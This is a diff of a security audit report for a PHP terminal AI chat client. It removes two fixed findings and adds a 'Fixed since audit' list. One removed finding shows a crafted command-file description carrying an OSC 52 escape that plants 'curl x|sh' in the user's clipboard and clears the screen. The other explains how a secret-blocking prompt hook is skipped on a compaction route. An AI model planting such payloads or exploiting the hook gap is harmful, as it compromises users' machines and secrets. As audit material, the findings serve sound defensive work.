@@ -15,26 +15,6 @@ Confidence labels:
 
 ## A. Turn state machine and queue
 
-### 15b-01 — A UserPromptSubmit hook is skipped when the prompt is parked behind the 85% model compaction
-- **Severity:** High · **Confidence:** Verified-by-repro (`r6_hook_bypass.php`)
-- **Where:** `src/Chat.php:7317` (`scheduleParkedCompaction()` is called inside `submit()`) runs before `src/Chat.php:7460` (`dispatchTurnHooks()`). The parked route resumes in `applyModelCompaction()` → `->dispatchTurn($compacted->history, [], $tokenLimit)` at `src/Chat.php:11703`. That route never calls `dispatchTurnHooks()`. The only call site is :7460.
-- **Code:**
-  ```php
-  $parked = $this->scheduleParkedCompaction($text, $tokenCount, $tokenLimit, $capNotice);
-  if ($parked !== null) { return $parked; }          // returns BEFORE the hook gate
-  ...
-  [$turnHookNotes, $turnHookRefusal] = $this->dispatchTurnHooks($text);   // :7460, never reached
-  ```
-- **Failure scenario:** The user has a `UserPromptSubmit` hook that blocks prompts containing secrets, the usual reason to have one. While history is under the tier, the hook fires and blocks. Once history passes the automatic-compaction tier and a `summaryBackend` is configured (the production default, `Bootstrap::summaryBackend()`), the same prompt is parked and the summary is requested. When the summary lands, the prompt is sent to the main model with the hook never run.
-  - Repro, same prompt `deploy with AWS_SECRET_ACCESS_KEY=AKIA…`:
-    - small history: `hook fired=1, main calls=0`
-    - past the tier: `hook fired=0, main calls=1 (secret rows=1)`
-  - The hook's `additionalContext` is lost as well, and `SessionStart` is skipped.
-- **Fix:** Run `dispatchTurnHooks($text)` in `submit()` before the compaction tiers, or at least before `scheduleParkedCompaction()`.
-  - If the hook refuses, return the refusal and do not park.
-  - Carry the hook notes on the parked request (for example in a `HistoryCompactedMsg` field) and prepend them in `applyModelCompaction()`.
-- **Test:** Build a Chat with `compactablePairs()` history, a `summaryBackend`, and a `deny` `UserPromptSubmit` hook. Submit. Assert that no summarization Cmd is returned, that `$main->calls() === 0`, and that the last row is the `Hook denied:` notice.
-
 ### 15b-02 — After a double-Escape cancel, tool placeholders stay "running" forever; later results land on the wrong row
 - **Severity:** High · **Confidence:** Verified-by-repro (`r2_stale_placeholder.php`)
 - **Where:** The cancel arm at `src/Chat.php:2069-2080` touches nothing but adds `'history' => [...$this->history, Message::system('_Request cancelled._')]`. In `replaceToolRunningPlaceholder()` at `src/Chat.php:3981`, the first `pendingToolCallId === $event->toolCallId` match wins, searching from the top of history.
@@ -206,28 +186,6 @@ Confidence labels:
 
 ## E. Repository-supplied and model-supplied text in overlays and panes
 
-### 15b-16 — A cloned repository's command file writes raw escapes (OSC 52 clipboard write, screen clear) to the terminal as soon as the user types "/"
-- **Severity:** High · **Confidence:** Verified-by-repro (`r15_overlay_inject.php`)
-- **Where:**
-  - `CommandSpec::fromFile()` → `stringField()` (`src/Commands/CommandSpec.php:866`) copies the frontmatter `description` and `argument-hint` verbatim. Only the *name* is validated, against `NAME_PATTERN`.
-  - `CommandLoader::loadAll()` loads `<root>/.sugar-crush/commands/*.md` for **every** checkout. `trustedProjectCommands` gates only `` !`…` `` execution (`Chat::refuseCommandShell()`), not loading or display.
-  - `Renderer::renderSlashMenu()` concatenates `' — ' . $spec->description` (`src/Renderer.php:3936`) and the hint (`:3990`) into the popup with no sanitizer. `clipToWidth()` is a plain `mb_substr`, used only when the text is too wide.
-  - The popup is joined into the frame at `:1365` without passing through `untrusted()`.
-- **Code:**
-  ```php
-  $tail = self::clipToWidth(' — ' . $spec->description, $budget - Width::string('/' . $plainName . $hint));
-  ...
-  $lines[] = $rowStyle->render(($index === $selected ? '▸ ' : '  ') . '/' . $name . $hint . $tail);
-  ```
-- **Failure scenario:** A repository ships `.sugar-crush/commands/lint.md` with `description: "Run lint \e]52;c;<base64 of 'curl x|sh'>\a\e[2J"` (YAML double-quoted `\e` is ESC). The user clones it, starts sugar-crush and types `/`, the normal first step to see what commands exist. The popup row puts `ESC ] 52 ; c ; … BEL` on the wire. Terminals that honour OSC 52 (kitty, WezTerm, Alacritty, Windows Terminal, iTerm2 when allowed, tmux with `set-clipboard on`) replace the clipboard with the attacker's text, ready for the user's next paste. `\e[2J` and cursor moves can also repaint the popup or the screen around it.
-  - Repro: the slash popup leaks `OSC52, CSI2J, CR`. `/help` and the Ctrl+P palette are clean for the same spec: `/help` goes through markdown, and the palette does not list the description.
-  - No trust step is involved, and no command needs to run.
-- **Fix:**
-  - Sanitize at the boundary. In `CommandSpec::fromFile()`, pass `description` and `argument-hint` through `PaneLabel::of()`, which strips `\p{C}` (C1 included) and flattens line breaks.
-  - Also apply `self::untrusted()` plus newline flattening inside `renderSlashMenu()`, as defence in depth for `CommandSpec::new()` callers.
-  - Audit the remaining `CommandSpec` text consumers (`/help`, the palette, `KeyHelp`) against the same rule.
-- **Test:** Load a temporary project command whose description contains `\e]52;c;eA==\a`, `\e[2J` and `\r\n`. Type `/` and render. Assert the frame contains no `\e]`, no `\e[2J` and no `\r`, and that the popup row is a single line.
-
 ### 15b-17 — Model or tool text containing U+E002+n paints a copy of on-screen image n at a position the text chooses, and blanks Nerd Font glyphs (lead 3)
 - **Severity:** Low-Medium · **Confidence:** Verified-by-repro (`r10_forged_marker.php`)
 - **Where:**
@@ -340,10 +298,8 @@ Confidence labels:
 
 | ID | Sev | Conf | Title |
 |---|---|---|---|
-| 15b-01 | High | Repro | UserPromptSubmit hook skipped on the parked 85% compaction route (secret-blocking hook does nothing) |
 | 15b-02 | High | Repro | Cancelled turn's "running" placeholders never healed; later same-id results land on the old row |
 | 15b-07 | High | Repro | Raw CR reaches the terminal (user/system rows, tool name/description, expanded tool output): pane overwrite and diff desync |
-| 15b-16 | High | Repro | A cloned repository's command-file description puts OSC 52 (clipboard write) and screen clears on the wire when "/" is typed |
 | 15b-03 | Med-High | Repro | Command output, mid-turn notices and background/runtime notices go to the model as real turns |
 | 15b-10 | Med-High | Repro | Full-history markdown re-render every frame: 0.7 s/keystroke at 200 exchanges; 2.1 s/frame for a 200 KB streaming partial |
 | 15b-04 | Medium | Reading | UserPromptSubmit/SessionStart hooks run synchronously inside update() (up to 60 s freeze) |
@@ -435,3 +391,12 @@ Confidence labels:
 | `r19_tabstrip.php` / `r19b_tabstrip_noevil.php` | Tab strip width and escapes, standalone and hosted (15b-18) |
 | `r20_rewind_args.php` | `/rewind help` rewinds; `/rename:x` stores `:x` (15b-22) |
 | `dbg.php` / `dbg2.php` | Scratch only |
+
+---
+
+## Fixed since audit
+
+These findings were fixed on master after the audit. Their sections and table rows were removed; the repro and coverage lists above still name them.
+
+- **15b-01** UserPromptSubmit hook skipped on the parked 85% compaction route — fixed on master in `9c13a918e`. Residual: if the summary later refuses the turn (spend cap or the 95% tier), the hook has already seen the prompt.
+- **15b-16** A cloned repository's command-file description wrote OSC 52 and screen clears to the terminal on "/" — fixed on master in `cb3dee7fd`.
